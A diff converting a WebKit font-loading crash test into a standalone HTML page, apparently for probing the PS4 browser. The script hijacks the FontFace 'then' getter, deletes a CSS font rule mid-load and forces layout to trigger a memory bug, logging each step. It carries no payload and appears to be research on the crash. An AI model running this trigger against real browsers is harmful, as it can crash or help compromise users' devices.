@@ -1,42 +1,149 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="UTF-8">
+<title>PS4 WebKit Font Memory Exploit Test</title>
+<style>
+body {
+    background: #000;
+    color: #0f0;
+    font-family: monospace;
+    padding: 20px;
+}
+#log {
+    border: 2px solid #0f0;
+    padding: 10px;
+    height: 400px;
+    overflow-y: auto;
+    background: #001100;
+}
+.error { color: #ff0000; }
+.success { color: #00ff00; }
+.info { color: #00ffff; }
+</style>
 <style id="s">
-@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+@font-face { 
+    font-family: x; 
+    src: url(nonexistent-font.woff); 
+    unicode-range: U+0042; 
+}
 </style>
 </head>
 <body>
+
+<h1>🎮 PS4 WebKit Font Memory Exploit</h1>
+<div id="log"></div>
+
 <script>
-if (window.testRunner) {
-    testRunner.dumpAsText();
-    testRunner.waitUntilDone();
-}
+
+const log = (msg, type = 'info') => {
+    const div = document.getElementById('log');
+    const entry = document.createElement('div');
+    entry.className = type;
+    entry.textContent = `[${new Date().toISOString().substr(11, 12)}] ${msg}`;
+    div.appendChild(entry);
+    div.scrollTop = div.scrollHeight;
+    console.log(msg);
+};
+
+log('PS4 WebKit Font Memory Exploit Test', 'success');
+log('Testing memory exhaustion bug...', 'info');
+
+window.onerror = (msg, url, line, col, error) => {
+    log(`ERROR: ${msg} at ${line}:${col}`, 'error');
+    return true;
+};
 
 window.onload = () => {
-    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-    void A.loaded;
-
-    let fired = false;
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            if (!fired && this === A) {
-                fired = true;
-                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                document.getElementById('s').sheet.deleteRule(0);
-                document.body.offsetTop;
+    log('Page loaded, starting exploit...', 'info');
+    
+    try {
+        // Create initial FontFace
+        log('Creating FontFace A with unicode U+0041...', 'info');
+        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+        document.fonts.add(A);
+        void A.loaded;
+        log('FontFace A created', 'success');
+        
+        let fired = false;
+        let triggerCount = 0;
+        
+        // Hijack FontFace.prototype.then
+        log('Hijacking FontFace.prototype.then getter...', 'info');
+        Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
+            get() {
+                log(`then getter triggered! (count: ${++triggerCount})`, 'info');
+                
+                if (!fired && this === A) {
+                    fired = true;
+                    log('First trigger - creating Y and Z fonts...', 'info');
+                    
+                    try {
+                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                        log('Created FontFace Y', 'success');
+                    } catch (e) {
+                        log(`Error creating Y: ${e.message}`, 'error');
+                    }
+                    
+                    try {
+                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                        log('Created FontFace Z', 'success');
+                    } catch (e) {
+                        log(`Error creating Z: ${e.message}`, 'error');
+                    }
+                    
+                    try {
+                        log('Deleting CSS font rule...', 'info');
+                        document.getElementById('s').sheet.deleteRule(0);
+                        log('CSS rule deleted', 'success');
+                    } catch (e) {
+                        log(`Error deleting rule: ${e.message}`, 'error');
+                    }
+                    
+                    try {
+                        log('Forcing layout with offsetTop...', 'info');
+                        document.body.offsetTop;
+                        log('Layout forced', 'success');
+                    } catch (e) {
+                        log(`Error forcing layout: ${e.message}`, 'error');
+                    }
+                }
+                return undefined;
             }
-            return undefined;
-        }
-    });
-    document.fonts.load('1em x', 'AB');
-    setTimeout(() => {
-        if (window.testRunner)
-            testRunner.notifyDone();
-    }, 0);
+        });
+        log('then getter hijacked successfully', 'success');
+        
+        // Trigger the exploit
+        log('Calling document.fonts.load() to trigger exploit...', 'info');
+        document.fonts.load('1em x', 'AB');
+        log('fonts.load() called', 'success');
+        
+        setTimeout(() => {
+            log('Exploit sequence complete!', 'success');
+            log('Checking memory state...', 'info');
+            
+            // Try to allocate more memory to see if we corrupted anything
+            try {
+                const bigArray = new Array(1000000);
+                log('Memory allocation test passed', 'success');
+            } catch (e) {
+                log(`Memory allocation FAILED: ${e.message}`, 'error');
+                log('🔥 MEMORY CORRUPTION DETECTED! 🔥', 'error');
+            }
+            
+            log('', 'info');
+            log('TEST COMPLETE', 'success');
+            log('Did PS4 show "Not enough system memory"?', 'info');
+        }, 100);
+        
+    } catch (e) {
+        log(`EXCEPTION: ${e.message}`, 'error');
+        log(`Stack: ${e.stack}`, 'error');
+    }
 };
+
 </script>
+
 </body>
 </html>
